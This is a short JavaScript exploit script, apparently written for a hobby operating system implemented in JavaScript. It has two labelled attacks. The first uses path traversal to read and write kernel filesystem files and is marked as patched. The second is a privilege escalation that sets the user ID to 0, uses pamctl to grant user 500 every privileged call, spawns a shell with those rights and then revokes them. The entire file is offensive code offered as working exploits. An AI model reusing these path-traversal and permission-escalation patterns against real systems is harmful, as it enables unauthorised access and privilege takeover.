/*
 ┏┓  • ┓  ┏┓  ┏          ┏┓       ┓   •
 ┣ ┏┓┓┏┫┏┓┗┓┏┓╋╋┓┏┏┏┓┏┓┏┓┣ ┏┓┓┏┏┓┏┫┏┓╋┓┏┓┏┓
 ┻ ┛ ┗┗┻┗┻┗┛┗┛┛┗┗┻┛┗┻┛ ┗ ┻ ┗┛┗┻┛┗┗┻┗┻┗┗┗┛┛┗
 Founded by. Sean Boleslawski, Benjamin Hornbeck and Lucienne Salim in 2023
 */

const predefinedCalls =
{
    setuid:  0x01,
    setgid:  0x02,
    usrmgr:  0x03,
    fsread:  0x04,
    fswrite: 0x05,
    exec:    0x06,
    sysctl:  0x07
};

function main(args)
{
    if (args[1] == "1")
    {
        print("EXPLOIT 1: KernelFS RW (patched)\n");
        chdir("/");
        print("READ\n");
        print("user file: \n" + fs_read("../kernelfs/user") + "\n");
        print("syscall file: \n" + fs_read("../kernelfs/syscall") + "\n");
        print("WRITE\n");
        fs_write("../kernelfs/meow","nyanya");
        print("meow file: \n" + fs_read("../kernelfs/meow") + "\n");
    } else if(args[1] == "2") {
        print("EXPLOIT 2: privelege escalation on conditions\n");
        
        // exploit checks because it only works on certain conditions
        if(permcheck(predefinedCalls["setuid"]) == false)
        {
            print("[!] no setuid perms :c\n");
            return 0;
        }
        print("[*] we have setuid perms\n");
        if(permcheck(predefinedCalls["exec"]) == false)
        {
            print("[!] no exec perms :c\n");
            return 0;
        }
        print("[*] we have exec perms\n");
        
        // gaining root priveleges in terms of userid
        if(setuid(0) != 0)
        {
            print("[!] setuid: permission denied\n");
        }
        print("[*] successfully setted uid to " + getuid() + "\n");
        
        // spawning the actual exploit
        let args = ["exploit", "2b"];
        exec("/bin/exploit.js", args, false);
    } else if(args[1] == "2b") {
        function pamctl(args)
        {
            print("running pamctl with " + args + "\n");
            exec("/sbin/pamctl.js", args, false);
        }
        
        print("[*] escalating priveleges\n");
        pamctl(["pamctl", "name", "500", "exploit2"]);
        pamctl(["pamctl", "call", "500", "add", "setuid"]);
        pamctl(["pamctl", "call", "500", "add", "setgid"]);
        pamctl(["pamctl", "call", "500", "add", "usrmgr"]);
        pamctl(["pamctl", "call", "500", "add", "fsread"]);
        pamctl(["pamctl", "call", "500", "add", "fswrite"]);
        pamctl(["pamctl", "call", "500", "add", "exec"]);
        pamctl(["pamctl", "call", "500", "add", "sysctl"]);
        print("[*] spawning with escalated perms\n");
        if(setuid(500) != 0)
        {
            print("[!] setuid: permission denied\n");
        }
        exec("/sbin/shell.js", [], false);
        print("[*] reverse escalating priveleges\n");
        pamctl(["pamctl", "name", "500", "0"]);
        pamctl(["pamctl", "call", "500", "rm", "setuid"]);
        pamctl(["pamctl", "call", "500", "rm", "setgid"]);
        pamctl(["pamctl", "call", "500", "rm", "usrmgr"]);
        pamctl(["pamctl", "call", "500", "rm", "fsread"]);
        pamctl(["pamctl", "call", "500", "rm", "fswrite"]);
        pamctl(["pamctl", "call", "500", "rm", "exec"]);
        pamctl(["pamctl", "call", "500", "rm", "sysctl"]);
    }
}
